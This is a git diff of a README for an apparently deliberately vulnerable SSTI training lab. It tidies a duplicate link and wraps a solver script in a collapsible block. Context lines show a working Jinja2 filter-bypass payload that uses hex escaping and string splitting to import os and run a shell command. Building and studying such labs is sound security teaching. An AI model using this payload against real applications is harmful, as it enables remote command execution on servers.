@@ -6,9 +6,6 @@ Welcome to the Ginger Juice Shop, where you can explore and learn about Server-S
 [Live Lab](https://ssti.pythonanywhere.com/)
 
 
-[Live Lab](https://ssti.pythonanywhere.com/)
-
-
 ### Homepage UI
 <img width="1512" alt="image" src="https://github.com/user-attachments/assets/e4caf1ae-d9d5-4089-a3c4-c522a6b83932">
 
@@ -74,6 +71,7 @@ The application provides two routes for exploring SSTI:
 
 ## Solution of hard
 #### Payload to bypass filters
+
 ```m
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fim'+'port\x5f\x5f')('o'+'s')|attr('popen')('id')|attr('read')()}}
 ```
@@ -81,8 +79,10 @@ The application provides two routes for exploring SSTI:
 
 <img width="1635" alt="image" src="https://github.com/user-attachments/assets/9b33eb97-8714-4552-aef4-248aed1c6573">
 
-
-`Solver.py`
+<details>
+ <summary>solution.py</summary>
+ <pre>
+  
 ```py
 from rich.console import Console
 from rich.prompt import Prompt
@@ -137,6 +137,8 @@ def run_shell():
 if __name__ == "__main__":
     run_shell()
 ```
+</pre>
+</details>
 
 ## Security Disclaimer
 
